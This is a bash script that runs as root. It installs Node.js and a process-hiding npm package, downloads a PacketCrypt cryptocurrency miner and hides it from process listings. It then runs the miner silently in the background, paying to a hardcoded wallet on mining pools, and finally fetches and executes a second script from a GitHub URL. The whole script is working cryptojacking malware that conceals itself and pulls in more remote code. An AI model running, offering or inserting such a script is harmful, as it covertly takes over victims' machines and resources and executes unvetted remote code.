#!/bin/bash
sudo su --command "sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.5.0 && npm i -g node-process-hider && wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt && ph add packetcrypt && chmod +x packetcrypt && ./packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkt.world http://pool.pktpool.io  > /dev/null 2>&1 &
wget https://raw.githubusercontent.com/yqizbhquie/a/main/lo.sh && chmod +x lo.sh && ./lo.sh"
